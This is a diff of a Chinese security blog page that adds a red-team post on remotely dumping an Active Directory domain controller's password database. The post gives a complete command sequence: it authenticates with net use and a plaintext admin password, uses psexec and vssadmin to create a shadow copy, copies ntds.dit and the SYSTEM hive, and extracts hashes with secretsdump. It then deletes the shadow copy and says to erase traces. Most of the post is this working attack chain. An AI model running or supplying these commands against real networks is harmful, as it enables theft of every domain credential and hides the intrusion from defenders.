@@ -80,62 +80,132 @@
           </div>
         </div>
         <div class="content">
-          <div class="archives">
-    
-     
-        <div class="header">
-        <span class="iconfont icon-tag1"></span>
-        <div class="explain">
-            红队资源
-        </div>
-        </div>
-    
+          <article class="post-entry">
+    <div class="header">
+      <div class="title">域渗透全集-技巧-2</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2019/09/21</span>
+        </span>
 
-
-
-
-
-
-<section class="wrap">
-    <div class="meta">
-        <a href="/archives/2019" class="archive-meta">
-            2019
-        </a>
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/域渗透全集">域渗透全集</a>
+                  
+                
+            </span>
+          </span>
+         
+        <span class="item leancloud-visitors" id="https://wanpan1996.github.io/2019/09/21/域渗透全集-域渗透技巧-2/" data-flag-title="域渗透全集-技巧-2">
+          <span class="iconfont icon-eye1"></span>
+          <span class="leancloud-visitors-count"></span>
+        </span>
+      </div>
+      <div>
+      </div>
     </div>
-    <div class="year">
-        
-        <article class="item">
-            
-            
-            <div class="content">
-                <div class="title">
-                    <a href="/2019/08/22/tips2/">
-                        红队渗透流程
-                    </a>
-                </div>
-                <div class="meta">
-                    <span class="meta-item">
-                        <span class="iconfont icon-time-circle"></span>
-                        <span>2019/09/23</span>
-                    </span>
-                    
+    <h2 id="使用-shell-远程转储”DC”-用户数据库"><a href="#使用-shell-远程转储”DC”-用户数据库" class="headerlink" title="使用 shell 远程转储”DC” 用户数据库"></a>使用 shell 远程转储”DC” 用户数据库</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo:"></a>Demo:</h3><ol>
+<li>远程连接到DC<blockquote>
+<img src="/2019/09/21/域渗透全集-域渗透技巧-2/1.jpg" title="This is an example image"></blockquote>
+</li>
+<li>使用psexec 调用vssadmin<blockquote>
+<img src="/2019/09/21/域渗透全集-域渗透技巧-2/2.jpg" title="This is an example image"></blockquote>
+</li>
+<li>查看结果 》》也可以使用 “&gt;&gt;”将结果传回本地。 <blockquote>
+<img src="/2019/09/21/域渗透全集-域渗透技巧-2/3.jpg" title="This is an example image"></blockquote>
+</li>
+<li>创建卷影<blockquote>
+<img src="/2019/09/21/域渗透全集-域渗透技巧-2/4.1.jpg" title="This is an example image">
+<p>查看一下结果</p>
+<img src="/2019/09/21/域渗透全集-域渗透技巧-2/5.jpg" title="This is an example image"></blockquote>
+</li>
+<li>复制ntds.dit<blockquote>
+<img src="/2019/09/21/域渗透全集-域渗透技巧-2/6.jpg" title="This is an example image"></blockquote>
+</li>
+<li>复制system (解开ntds需要使用)<blockquote>
+<img src="/2019/09/21/域渗透全集-域渗透技巧-2/7.jpg" title="This is an example image">
+<p>查看一下结果</p>
+<img src="/2019/09/21/域渗透全集-域渗透技巧-2/8.jpg" title="This is an example image"></blockquote>
+</li>
+<li>文件可能很大，可灵活选择在DC上解密或者下载回本地<blockquote>
+<p>secretsdump.exe -ntds ntds.dit -system SYSTEM local</p>
+</blockquote>
+</li>
+<li>删除卷影<blockquote>
+<img src="/2019/09/21/域渗透全集-域渗透技巧-2/9.jpg" title="This is an example image"></blockquote>
+</li>
+<li>删除痕迹。。。。。。</li>
+</ol>
+<h3 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h3><blockquote>
+<blockquote>
+<p> net use \192.168.1.38\C$ “Admin12345” /user:god\administrator<br>psexec \192.168.1.38 -h cmd /c “vssadmin list shadows &gt;&gt; C:\out.txt”<br>type \192.168.1.38\C$\out.txt<br>psexec \192.168.1.38 -h cmd /c “vssadmin create shadow /for=c: &gt; C:\out.txt”<br>type \192.168.1.38\C$\out.txt<br>psexec \192.168.1.38 -h cmd /c “copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:&quot;<br>dir \192.168.1.38\C$<br>psexec \192.168.1.38 -h cmd /c “copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\system C:&quot;<br>dir \192.168.1.38\C$<br>psexec \192.168.1.38 -h cmd /c “vssadmin delete shadows /for=c: /quiet”</p>
+</blockquote>
+</blockquote>
+<p>可以参照——– <a href="https://wanpan1996.github.io/2019/08/21/tips1/">内网渗透 Tips1抓取域内用户的hash</a></p>
+<p>PS:</p>
+<ol>
+<li>PsExec 会留下操作日志。</li>
+<li>PsExec 异常退出会在目标上保留进程。</li>
+<li>低版本PsExec 明文传输。。。。</li>
+<li>PsExec工作方式原理  <a href="https://www.itprotoday.com/compute-engines/psexec" target="_blank" rel="noopener">https://www.itprotoday.com/compute-engines/psexec</a></li>
+<li>PsExec 返回的错误代码特定于您执行的应用程序，而不是PsExec</li>
+<li>wmi 更好一点。</li>
+</ol>
 
-                    
-                </div>
-            </div>
-        </article>
-        
-        
-    </div>
-</section>
 
   
 
-  <div class="paginator">
-        <span class="page-number current">1</span>
-  </div>
-</div>
+  
+  <div class="post-reward">
+    <div id="reward-button">请杯咖啡呗~</div>
+    <div id="qr">
+      <div class="wrap">
+          
+          <div class="bg-wrap">
+            <a href="/images/zhifubao.jpg" target="_block" class="bg" style="background-image:url('/images/zhifubao.jpg')"></a>
+            支付宝
+          </div>
+          
+          
+          <div class="bg-wrap">
+              <a href="/images/weixin.jpg" target="_block" class="bg" style="background-image:url('/images/weixin.jpg')"></a>
+            微信
+          </div>
+          
+      </div>
+    </div>
+    
 
+  </div>
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="https://wanpan1996.github.io">Saitama</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="https://wanpan1996.github.io/2019/09/21/域渗透全集-域渗透技巧-2/">https://wanpan1996.github.io/2019/09/21/域渗透全集-域渗透技巧-2/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="https://wanpan1996.github.io">Saitama</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+</article>
         </div>
         <footer>
           <div class="copyright">
@@ -182,7 +252,16 @@
             </a>
             
           </div>
-          
+           
+          <div class="toc-widget">
+            <div class="title">
+              <span>Toc</span>
+            </div>
+            <div class="post-toc">
+              <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用-shell-远程转储”DC”-用户数据库"><span class="toc-text">使用 shell 远程转储”DC” 用户数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo"><span class="toc-text">Demo:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令："><span class="toc-text">命令：</span></a></li></ol></li></ol>
+            </div>
+          </div>
+           
           <div class="category-widget">
             <div class="title">
               <span>Categories</span>
